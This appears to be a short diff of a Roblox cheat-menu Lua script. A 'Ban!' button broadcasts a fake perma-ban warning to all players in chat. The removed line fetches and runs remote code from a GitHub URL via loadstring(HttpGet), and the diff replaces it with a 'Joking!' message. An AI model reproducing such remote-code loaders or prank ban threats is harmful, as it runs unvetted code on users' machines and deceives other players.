@@ -7,5 +7,5 @@ end)
 Create('Ban!',function()
     game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Perma-Ban in 20 Seconds.', 'All');
 wait(20)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bemey99/GodMode/main/DaHood/Workint2024/March"))()
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Joking!', 'All');
 end)
